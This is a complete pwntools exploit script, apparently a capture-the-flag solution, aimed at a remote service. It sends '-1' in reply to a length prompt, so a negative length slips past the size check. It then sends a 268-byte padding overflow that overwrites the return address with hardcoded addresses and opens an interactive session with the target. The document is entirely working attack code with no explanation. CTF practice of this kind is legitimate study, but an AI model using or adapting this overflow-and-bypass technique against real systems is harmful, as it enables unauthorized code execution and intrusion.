from pwn import *

p = remote("remote.goatskin.kr",50006)

context.log_level = "debug"

payload = "A" * 268
payload += p32(0x08048450)
payload += p32(0)
payload += p32(0x080487c9)

p.recvuntil("Length?")
p.sendline("-1")
p.sendline(payload)

p.interactive()
